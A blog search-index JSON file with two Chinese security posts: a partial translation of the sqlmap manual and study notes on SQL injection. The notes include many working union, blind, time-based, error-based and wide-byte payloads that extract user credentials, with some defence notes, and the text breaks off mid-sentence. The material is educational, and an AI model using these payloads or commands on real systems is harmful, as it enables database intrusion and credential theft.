{"meta":{"title":"Emerald Dream","subtitle":null,"description":null,"author":"chessur","url":"https://chirec.github.io","root":"/"},"pages":[],"posts":[{"title":"'Sqlmap使用手册(未完成)'","slug":"Sqlmap-Usage","date":"2019-04-14T09:03:02.000Z","updated":"2019-04-14T12:21:56.575Z","comments":true,"path":"2019/04/14/Sqlmap-Usage/","link":"","permalink":"https://chirec.github.io/2019/04/14/Sqlmap-Usage/","excerpt":"为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。","text":"为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259Usage: python sqlmap.py [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program&apos;s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file Request: These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST (e.g. &quot;id=1&quot;) --param-del=PARA.. Character used for splitting parameter values (e.g. &amp;) --cookie=COOKIE HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;) --cookie-del=COO.. Character used for splitting cookie values (e.g. ;) --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;) --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore (problematic) HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3) --randomize=RPARAM Randomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit for extraction of anti-CSRF token --force-ssl Force usage of SSL/HTTPS --hpp Use HTTP parameter pollution method --eval=EVALCODE Evaluate provided Python code before the request (e.g. &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization: These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) Injection: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) --skip=SKIP Skip testing for given parameter(s) --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) --dbms=DBMS Force back-end DBMS to provided value --dbms-cred=DBMS.. DBMS authentication credentials (user:password) --os=OS Force back-end DBMS operating system to provided value --invalid-bignum Use big numbers for invalidating values --invalid-logical Use logical operations for invalidating values --invalid-string Use random strings for invalidating values --no-cast Turn off payload casting mechanism --no-escape Turn off string escaping mechanism --prefix=PREFIX Injection payload prefix string --suffix=SUFFIX Injection payload suffix string --tamper=TAMPER Use given script(s) for tampering injection data Detection: These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) --string=STRING String to match when query is evaluated to True --not-string=NOT.. String to match when query is evaluated to False --regexp=REGEXP Regexp to match when query is evaluated to True --code=CODE HTTP code to match when query is evaluated to True --text-only Compare pages based only on the textual content --titles Compare pages based only on their titles Techniques: These options can be used to tweak testing of specific SQL injection techniques --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) --union-cols=UCOLS Range of columns to test for UNION query SQL injection --union-char=UCHAR Character to use for bruteforcing number of columns --union-from=UFROM Table to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response --second-req=SEC.. Load second-order HTTP request from file Fingerprint: -f, --fingerprint Perform an extensive DBMS version fingerprint Enumeration: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements -a, --all Retrieve everything -b, --banner Retrieve DBMS banner --current-user Retrieve DBMS current user --current-db Retrieve DBMS current database --hostname Retrieve DBMS server hostname --is-dba Detect if the DBMS current user is DBA --users Enumerate DBMS users --passwords Enumerate DBMS users password hashes --privileges Enumerate DBMS users privileges --roles Enumerate DBMS users roles --dbs Enumerate DBMS databases --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema --count Retrieve number of entries for table(s) --dump Dump DBMS database table entries --dump-all Dump all DBMS databases tables entries --search Search column(s), table(s) and/or database name(s) --comments Check for DBMS comments during enumeration -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDE DBMS database identifier(s) to not enumerate -U USER DBMS user to enumerate --exclude-sysdbs Exclude DBMS system databases when enumerating tables --pivot-column=P.. Pivot column name --where=DUMPWHERE Use WHERE condition while table dumping --start=LIMITSTART First dump table entry to retrieve --stop=LIMITSTOP Last dump table entry to retrieve --first=FIRSTCHAR First query output word character to retrieve --last=LASTCHAR Last query output word character to retrieve --sql-query=QUERY SQL statement to be executed --sql-shell Prompt for an interactive SQL shell --sql-file=SQLFILE Execute SQL statements from given file(s) Brute force: These options can be used to run brute force checks --common-tables Check existence of common tables --common-columns Check existence of common columns User-defined function injection: These options can be used to create custom user-defined functions --udf-inject Inject custom user-defined functions --shared-lib=SHLIB Local path of the shared library File system access: These options can be used to access the back-end database management system underlying file system --file-read=FILE.. Read a file from the back-end DBMS file system --file-write=FIL.. Write a local file on the back-end DBMS file system --file-dest=FILE.. Back-end DBMS absolute filepath to write to Operating system access: These options can be used to access the back-end database management system underlying operating system --os-cmd=OSCMD Execute an operating system command --os-shell Prompt for an interactive operating system shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC --os-bof Stored procedure buffer overflow exploitation --priv-esc Database process user privilege escalation --msf-path=MSFPATH Local path where Metasploit Framework is installed --tmp-path=TMPPATH Remote absolute path of temporary files directory Windows registry access: These options can be used to access the back-end database management system Windows registry --reg-read Read a Windows registry key value --reg-add Write a Windows registry key value data --reg-del Delete a Windows registry key value --reg-key=REGKEY Windows registry key --reg-value=REGVAL Windows registry key value --reg-data=REGDATA Windows registry key value data --reg-type=REGTYPE Windows registry key value type General: These options can be used to set some general working parameters -s SESSIONFILE Load session from a stored (.sqlite) file -t TRAFFICFILE Log all HTTP traffic into a textual file --batch Never ask for user input, use the default behavior --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) --check-internet Check Internet connection before assessing the target --crawl=CRAWLDEPTH Crawl the website starting from the target URL --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) --charset=CHARSET Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;) --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) --eta Display for each output the estimated time of arrival --flush-session Flush session files for current target --forms Parse and test forms on target URL --fresh-queries Ignore query results stored in session file --har=HARFILE Log all HTTP traffic into a HAR file --hex Use hex conversion during data retrieval --output-dir=OUT.. Custom output directory path --parse-errors Parse and display DBMS error messages from responses --preprocess=PRE.. Use given script(s) for preprocessing of response data --repair Redump entries having unknown character marker (?) --save=SAVECONFIG Save options to a configuration INI file --scope=SCOPE Regexp to filter targets from provided proxy log --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) --update Update sqlmap Miscellaneous: -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) --alert=ALERT Run host OS command(s) when SQL injection is found --answers=ANSWERS Set predefined answers (e.g. &quot;quit=N,follow=N&quot;) --beep Beep on question and/or when SQL injection is found --cleanup Clean up the DBMS from sqlmap specific UDF and tables --dependencies Check for missing (optional) sqlmap dependencies --disable-coloring Disable console output coloring --gpage=GOOGLEPAGE Use Google dork results from specified page number --identify-waf Make a thorough testing for a WAF/IPS protection --list-tampers Display list of available tamper scripts --mobile Imitate smartphone through HTTP User-Agent header --offline Work in offline mode (only use session data) --purge Safely remove all content from sqlmap data directory --skip-waf Skip heuristic detection of WAF/IPS protection --smart Conduct thorough tests only if positive heuristic(s) --sqlmap-shell Prompt for an interactive sqlmap shell --tmp-dir=TMPDIR Local directory for storing temporary files --web-root=WEBROOT Web server document root directory (e.g. &quot;/var/www&quot;) --wizard Simple wizard interface for beginner users Output verbosity1-v 通过这个参数来设置输出文本的可见度。共有7个可见度等级，默认等级为1，在这个等级下，information,warning,error,critical messages and python tracebacks会被显示出来。 12345670、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。 想理解sqlmap在后台做了些什么，等级2比较合适；想看到payload构造，等级3是最好的选择，如果你需要向开发者反馈潜在漏洞，同样推荐等级3，配合-t来保存日志文件；想要进一步查找潜在的bug或意想不到的行为，推荐等级4或更高等级；使用-v可以代替-v 2，-vv代替-v 3，-vvv代替-v 4，以此类推。 Target直接连接数据库1-d 使用sqlmap连接一个数据库，需要下面2种格式的连接字符串。 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.) DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.) For example: 1$ python sqlmap.py -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot; -f --banner --dbs --users 指定目标URL12-u--url 使用sqlmap测试目标URL，需要下面格式的URL http(s)://targeturl[:port]/[...] For example: 1$ python sqlmap.py -u http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users 从Burp或WebScarab的代理日志中获取目标1-l 从Burp proxy和Web Scarab proxy的代理日志文件中解析出可能的攻击目标，参数后跟日志文件路径 从站点地图文件中获取目标1-x 为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测。 For example: 1$ python sqlmap.py -x http://www.target.com/sitemap.xml 从文本文件中获取目标1-m 将多个目标URL写在一个文本文件中，sqlmap会按顺序扫描每个URL。 For example: 将待测URL写在urls.txt中，格式如下 123www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1* 运行sqlmap 1$ python sqlmap.py -m urls.txt 从文本文件中加载HTTP请求1-r 从文本文件中加载原始HTTP请求，这种方式可以让你跳过输入一些参数，如设置cookie，post数据等。可以使用BurpSuite抓包并保存HTTP请求文件 HTTP请求文件格式 12345POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1 sqlmap支持HTTPS，可以在命令后加上--force-ssl强制使用SSL连接到443/tcp端口。也可以在Host头后加上:443来使用HTTPS。 将Google搜索结果作为目标1-g sqlmap获取google搜索的前100个结果，对其中有GET参数的URL进行测试并询问是否测试每一个URL。 For example: 1$ python sqlmap.py -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot; 从配置文件中载入目标1-c 将攻击目标及各种参数写在配置文件中，sqlmap可以通过加载配置文件对目标进行测试。在sqlmap的安装根目录下有sqlmap.conf文件，这是配置文件的模板，可以根据需求写入参数。 RequestHTTP 请求方式1--method sqlmap会自动检测正确的HTTP请求方式。然而，在一些情况下，需要使用不会自动识别的特殊HTTP请求方式，例如PUT，这时就需要指定请求方式。 For example: 1--method=PUT HTTP POST数据1--data 默认情况下，sqlmap使用GET，但你可以通过提供POST数据将请求方式改为POST。这些数据会被当做SQL注入测试的参数。 For example: 1$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users 指定参数分割符1--param-del 有些情况下，默认参数分割符(e.g. GET和POST中的&amp;)需要被指定为新的分割符来保证sqlmap可以正常差分并处理每个参数。 For example: 12$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=\\1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users HTTPCookie 1234--cookie--cookie-del--load-cookies--drop-set-cookie 使用这些参数的2中情况： 测试页面需要基于cookie的登录认证，并且你有这些数据 想要测试cookie注入(当--level设置为2或更高时，sqlmap会检测cookie注入) 两种情况均需要使用sqlmap发送cookie，可以使用下方步骤发送cookie 登录网页 从浏览器中获取cookie 将第二步获得cookie作为--cookie的值 注意，HTTP cookie中的值通常由;来分割，而不是&amp;。sqlmap可以从GET和POST参数中，分辨出cookie并将其作为独立参数。为了防止分割符不是;可以通过–-cookie-del来设置分割符。 在后续的连接中，若HTTP响应头仍有Set-Cookie，sqlmap会自动使用之前设置的cookie，并测试这些值。可以通过--drop-set-cookie参数使sqlmap忽略Set-Cookie。 反之，如果你提供了一个HTTPCookie头，并且使用了--cookie，而且目标URL每次都发送HTTP Set-Cookie，这时，sqlmap会询问你要为HTTP请求使用哪组cookie。 可以使用--load-cookies载入文件中包含的Netscape/wget格式的cookie。 参考[1] sqlmap_Usage [2] Sqlmap中文手册","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'SQL注入总结'","slug":"Sql-Injection","date":"2019-04-11T12:15:59.000Z","updated":"2019-04-17T10:49:18.326Z","comments":true,"path":"2019/04/11/Sql-Injection/","link":"","permalink":"https://chirec.github.io/2019/04/11/Sql-Injection/","excerpt":"1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件","text":"1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件 3. 显错注入3.1 常用函数3.1.1 显示信息12345678user() @@hostnameversion() @@versiondatabase() @@tmpdir@@datadir@@basedir 3.1.2 拼接字段123456concat() 拼接多个字符串concat(username,0x7e,password)group_concat() 拼接表头group_concat(username,password)concat_ws() 拼接字符串，第一个字符串为分割符concat_ws(0x7e,username,password) 3.1.3 截取字段12345mid() 适用于MySQLsubstr() 适用于Oracle MySQL SQLSERVERsubstring() 适用于MySQL SQLSERVERleft()right() 3.1.4 条件判断123if(判断的条件，条件为真返回值，条件为假返回值)select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;); 123case when 判断的条件 then 条件为真返回值 else 条件为假返回值 endselect case when 1=1 then &apos;true&apos; else &apos;false&apos; end;select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end; 3.1.5 判断字段数1order by 3.2 数据库的注释12345#%23--+--&amp;nbsp--%20 3.3 union 联合查询联合查询的前后字段数要求相同 1select uname,password,gender from users union select 1,2,3; 3.4 系统数据库3.4.1 information_schemamysql版本5.0以上，系统自带。汇总所有数据库的库名、表名、字段名。 3.4.1.1 columns表 字段名 存放数据 table_schema 存放所有数据库的库名 table_name 存放所有表名 column_name 存放所有字段名 privileges 存放可操作语句 3.4.1.2 tables表 字段名 存放数据 table_schema 存放所有数据库的库名 table_name 存放所有表名 3.4.2 常用查询3.4.2.1 查询所有数据库的库名1select distinct table_schema from information_schema.columns; 3.4.2.2 查询数据库中某个数据库中的所有表名1select distinct table_name from information_schema.columns where table_schema=&apos;chessur&apos;; 3.4.2.3 查询数据库中某个数据库中某个表的所有字段名1select distinct column_name from information_schema.columns where table_schema=&apos;chessur&apos; and table_name=&apos;users&apos;; 3.5 手工注入流程3.5.1 Step 1 判断是否有注入判断从后台数据库中选取的列数，判断哪几列在前端显示 3.5.2 Step 2 收集数据库信息（用户名，版本，当前数据库名）123select version();select user();select database(); 3.5.3 Step 3 获取当前数据库下的所有表名1select group_concat(distinct table_name) from information_schema.columns where table_schema=database(); 3.5.4 Step 4 获取当前数据库下指定表中字段名1select group_concat(distinct table_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;; 3.5.5 Step 5 获取字段对应的数据1select group_concat(distinct password) from users; 3.5.6 Step 6 解密数据数据库中有些数据会加密存放，所以需要解密。 4. 盲注因为不能回显错误信息，所以盲注要一个字符一个字符的尝试，通过二分法可以节省很多时间。 4.1 常用函数4.1.1 显示字段长度1length() 4.1.2 显示ASCII12ascii()ord() 4.1.3 截取字段12345mid() 适用于MySQLsubstr() 适用于Oracle MySQL SQLSERVERsubstring() 适用于MySQL SQLSERVERleft()right() 4.1.4 等待函数1sleep() 1benchmark() 4.2 布尔盲注4.2.1 Step 1 探测注入点123?id=1&apos; ?id=1&apos; and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 # 根据页面的显示效果判断是否有注入点 4.2.2 Step 2 收集数据信息收集当前用户名、当前数据库、当前数据库版本 1and substr((select version()),1,1)&gt;4 //判断数据库版本是否大于4 5.0以上的mysql数据库有information_schema数据库。 4.2.3 Step 3 查询当前数据库中的表名12and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),1,1))=33 //判断第一个字符and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),2,1))=33 //判断第二个字符 12345and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第一个表名长度and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第二个表名长度and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)) //第一个表的第一个字符and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),2,1)) //第一个表的第二个字符and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 1,1),1,1)) //第二个表的第一个字符 4.2.4 Step 4 获取指定表的字段名123and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33 //判断第一个字段的第一个字符and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33 //判断第一个字段的第二个字符and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33 //判断第二个字段的第一个字符 4.2.5 Step 5 获取字段数据123and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第一个数据的第一个字符and ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33 //判断第一个数据的第二个字符and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第二个数据的第一个字符 4.3 延时注入无法通过布尔盲注来判断SQL语句是否执行成功时，可以尝试报错延时注入。延时注入也叫基于时间的盲注。判断依据：页面加载时间延时注入使用条件判断语句以及等待函数来判断SQL语句是否执行成功。 4.3.1 延时函数4.3.1.1 sleep()1sleep(5) //让数据库等待5秒，再返回结果 4.3.1.2 benchemark()1benchmark(500000000,md5(&apos;abc&apos;)) 4.3.1.3 Heavy Query有些时候，无法使用延时函数来进行延时注入。这种情况下，最好的选择是使用数据库需要执行很久的sql语句。 1SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C 上面这个语句，在我的数据库中执行了22.15秒 4.3.2 条件判断123if(判断的条件，条件为真返回值，条件为假返回值)select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;); 123case when 判断的条件 then 条件为真返回值 else 条件为假返回值 endselect case when 1=1 then &apos;true&apos; else &apos;false&apos; end;select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end; 4.3.3 基本构造1?id=1&apos; and if(1=1,1,sleep(5)) # 4.3.4 注入流程4.3.4.1 Step 1 探测注入点123?id=1&apos; ?id=1&apos; and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 # 4.3.4.2 Step 2 收集数据信息123?id=1 and if(substr(version(),1,1)&gt;4,1,sleep(5)) #?id=1 and if(ord(substr(database(),1,1))=33,1,sleep(5)) #?id=1 and if(ord(substr(database(),2,1))=33,1,sleep(5)) # 4.3.4.3 Step 3 查询当前数据库中的表名123?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=33,1,sleep(5))?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),2,1))=33,1,sleep(5))?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 1,1),1,1))=33,1,sleep(5)) 4.3.4.4 Step 4 查询指定表的字段名123?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33,1,sleep(5))?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33,1,sleep(5))?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33,1,sleep(5)) 4.3.4.5 Step 5 获取字段数据123and if(ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33,1,sleep(5))and if(ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33,1,sleep(5))and if(ascii(substr((select concat(username,password)from users limit 1,1),1,1))=33,1,sleep(5)) 4.4 DNSlog在盲注中的使用4.4.15. 报错注入5.1 extractvalue(参数1，参数2)从目标XML中返回查询的字符串，参数1是string格式，XML文档名，参数2是XPATH格式，要查询的字符串 1select extractvalue(1,concat(0x7e,(select user()),0x7e)) 5.2 updatexml(参数1，参数2，参数3)改变文档中符合条件的节点的值，参数1是XML文档，参数2是XPATH格式的字符串，参数3是string格式的替换查找符合条件的数据 1select updatexml(1,concat(0x7e,(select user()),0x7e),1) 前两个报错函数的长度有限制 32位 5.3 floor()必须和count() rand() group by一起使用才能报错 1select * from messages where ID=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 5.3.1 原理报错原因是主键重复，这个主键是虚拟表的主键。再进行group by查询过程中，先建立一张虚拟表，一行一行地插入内容，rand()函数也会多次计算，由于floor(rand(0)*2)能产生的值只有0和1，所以在第三次查询的时候就必然产生重复，所以第三次查询时必会报错。 1.查询前默认会建立空虚拟表 2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕 3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕 4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 From：【学习笔记】MYSQL的floor报错原理分析总结 5.4 GeometryCollection()1and GeometryCollection(()select *from(select user () )a)b ); 5.5 NAME_CONST()1and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5.6 join1select * from(select * from mysql.user ajoin mysql.user b)c; 5.7 exp()1and exp(~(select * from (select user () ) a) ); 5.8 polygon()1and polygon (()select * from(select user ())a)b ); 5.9 multipoint()1and multipoint (()select * from(select user() )a)b ); 5.10 multlinestring ()1and multlinestring (()select * from(selectuser () )a)b ); 5.11 multpolygon ()1and multpolygon (()select * from(selectuser () )a)b ); 5.12 linestring ()1and linestring (()select * from(select user() )a)b ); 6. 伪静态注入6.1 伪静态网站页面展示时html一类的静态页面，但其实使用asp一类的动态脚本来处理的。 6.2 生成伪静态网站以PHP为例 6.2.1 开启Apache的mod_rewrite12/apache/conf/httpd.confLoadModule rewrite_module 6.2.2 让Apache支持.htacess12/apache/conf/httpd.confAllowOverride All 6.2.3 建立.htacess文件在文件中写入 12RewriteEngine onRewriteRule (.*)\\.html$ index.php?id=$1 RewriteRule 实质时正则表达式进行匹配，可以根据自己需求更改 6.3 分辨真/伪静态网站可以通过查看网页最后修改时间来判断在地址栏输入 1javascript:alert(document.lastModified) 如果得到的时间和现在时间一致，则为伪静态网站，反之是真静态网站。 6.4 手工注入6.4.1 判断注入点12?1&apos;/**/and/**/1=1/*.html ?1&apos;/**/and/**/1=2/*.html 6.4.2 Tips 伪静态的注入和URL的普通GET注入不太相同。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用/**/这个注释符号表示空格。From：伪静态注入的总结 7. 宽字节注入7.1 原理数据库中采用GBK编码，并对用户输入的数据进行转义GBK中汉字占用2个字节ASCII中汉字占用1个字节 7.2 常见转义函数1234addslaches()mysql_real_escape_string() //不会对%和_进行转义mysql_escape_string() //5.3及以后就废弃magic_quotes_gpc //魔术引号GPC模块 7.2.1 转义1234&apos; ---&gt; \\&apos;&quot; ---&gt; \\&quot;\\ ---&gt; \\\\NULL ---&gt; \\NULL 7.3 注入过程1234id=1%df&apos; id=1%df\\&apos; //&apos;转义为\\&apos;id=1%df%5c&apos; //\\的URL编码为%5cid=1運&apos; //%df%5c在数据库中因为GBK编码变为運，&apos;逃逸出来，形成注入点 7.4 手工注入和显错注入过程相同 7.5 PDO宽字节注入7.5.1 条件1.数据库使用GBK编码2.使用转义函数，如addslaches()3.PHP版本&lt;5.3.6 使用PDO连接数据库，没有参数过滤 7.5.2 防御7.5.2.1 使用mysqli_set_charset() 而不是 set namesmysqli_set_charset()和set names的区别查看深入理解SET NAMES和mysql(i)_set_charset的区别 7.5.2.2 使用mysql_real_escape_string()mysql_real_escape_string()与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面df和5c拼接为一个宽字节的问题，使用mysqli_set_charset进行指定字符集 7.5.2.3 正确使用占位符确保每一个传入参数都先使用占位符进行代替 7.5.2.4 使用预处理注意，即使mysql版本支持预处理，某些语句mysql无法支持prepare，那么pdo在处理时还是会使用模拟预处理。这样可能会存在注入的风险。具体可以查看这篇回答：are-pdo-prepared-statements-sufficient-to-prevent-sql-injection 8. 二次解码注入8.1 原理浏览器出去的数据会被进行URL编码，到达服务器之后，默认会被URL解码mysql_real_escape_string()等转义函数是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。 8.2 过程123id=1%2527id=1%27 //id=1&apos; //urldecode() 8.3 防御8.3.1 预处理使用PDO的prepare进行预编译处理数据库查询 8.3.2 过滤函数PHP常使用的过滤函数有addslashes()、mysql_escape_string()、msyql_real_string()、intval()函数等，在程序进行SQL语句运行之前使用。 8.3.3 魔术引号通常数据污染的方式有两种：一种是应用被动接收参数，类似于GET、POST等；另一种是主动获取参数，类似与读取远程桌面页面或者文件内容等。在PHP中魔术引号配置方法，magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤，magic_quotes_runtime对数据库或者文件中获取的数据进行过滤。 9. HTTP头部注入9.1 cookie注入post和get方式被过滤，只能通过cookie传递数据，刚好服务器没有过滤cookie数据，然后在cookie中添加测试的payload 1javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;25&quot;)) 9.2 XFF注入1python sqlmap.py -u &quot;&quot; --headers=&quot;x-forwarded-for:*&quot; -v --batch 10. 二次注入二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 10.1 原理在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 